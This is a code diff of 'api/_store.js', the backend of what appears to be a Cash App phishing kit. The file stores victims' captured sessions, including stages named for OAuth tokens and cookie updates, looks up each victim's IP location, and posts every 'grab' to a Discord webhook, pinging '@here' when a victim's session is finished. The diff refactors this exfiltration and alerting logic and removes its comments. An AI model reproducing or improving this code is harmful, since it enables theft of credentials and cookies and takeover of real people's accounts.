@@ -1,9 +1,5 @@
 /* ============================================================
    api/_store.js
-   Persistence + Discord dispatch.
-
-   Storage: Upstash Redis REST if configured, else in-memory.
-   Env: UPSTASH_REDIS_REST_URL / _TOKEN  (or KV_REST_API_URL / _TOKEN)
    ============================================================ */
 
 import {
@@ -14,11 +10,15 @@ import {
   buildPayload,
   buildText,
   geoLookup,
+  webhookConfigured,
 } from './_discord.js';
 
 const KEY = 'cashapp:adder:grabs';
 const MAX = 1000;
 const SKIP = new Set(['verify', 'unload']);
+
+const PING = process.env.DISCORD_PING || '@here';
+const ON_LOAD = (process.env.DISCORD_ON_LOAD || 'true') === 'true';
 
 function cfg() {
   return {
@@ -41,7 +41,6 @@ async function cmd() {
   return j.result;
 }
 
-/* ---------- persistence ---------- */
 export async function save(row) {
   const json = JSON.stringify(row);
   try {
@@ -69,7 +68,6 @@ export async function all() {
   return globalThis.__grabs || [];
 }
 
-/* ---------- dedupe (sendBeacon + fetch double-fire) ---------- */
 export async function firstTime(key) {
   try {
     const r = await cmd('SET', 'cashapp:seen:' + key, '1', 'NX', 'EX', '120');
@@ -83,7 +81,6 @@ export async function firstTime(key) {
   return true;
 }
 
-/* ---------- message id cache (fallback when client id is missing) ---------- */
 export async function getMsgId(sid) {
   try {
     const v = await cmd('GET', 'cashapp:msg:' + sid);
@@ -100,15 +97,10 @@ export async function setMsgId(sid, id) {
   m[sid] = id;
 }
 
-/* ---------- dispatch ---------- */
-/**
- * Sends or updates the Discord message for this grab.
- * @returns {Promise<string|null>} the Discord message id
- */
 export async function notify(row) {
-  if (!process.env.DISCORD_WEBHOOK) return null;
+  if (!webhookConfigured()) return null;
   if (SKIP.has(row.stage)) return null;
-  if (row.stage === 'landed' && process.env.DISCORD_ON_LOAD !== 'true') return null;
+  if (row.stage === 'landed' && !ON_LOAD) return null;
 
   const sid = row.sid || 'anon';
   const sid8 = sid.slice(0, 8);
@@ -116,18 +108,15 @@ export async function notify(row) {
   const fmt = process.env.DISCORD_FORMAT || 'embed';
   const meta = stageMeta(row.stage);
   const geo = await geoLookup(row.ip);
-  const ping = process.env.DISCORD_PING || '';
   const isFinal = row.stage === 'done' || row.stage.indexOf('oauth_token') === 0;
 
-  // a late cookie_update must not clobber a finished session
   if (row.stage === 'cookie_update' && (await getMsgId(sid + ':done'))) return null;
 
   const build = (withPing) => {
-    const p = withPing ? (ping || '@here') : '';
+    const p = withPing ? PING : '';
     return fmt === 'text' ? buildText(row, meta, geo, p) : buildPayload(row, meta, geo, p);
   };
 
-  /* ---- verbose: a brand new message for every stage ---- */
   if (mode === 'verbose') {
     const payload = build(isFinal);
     const res = isFinal
@@ -137,7 +126,6 @@ export async function notify(row) {
     return res && res.id ? res.id : null;
   }
 
-  /* ---- live: one message per victim, edited in place ---- */
   let msgId = row.msgId || (await getMsgId(sid));
 
   if (msgId) {
@@ -153,7 +141,6 @@ export async function notify(row) {
 
   if (msgId) await setMsgId(sid, msgId);
 
-  /* ---- final: edits don't buzz a phone, so post a fresh pinged copy ---- */
   if (isFinal) {
     await setMsgId(sid + ':done', '1');
     const payload = build(true);
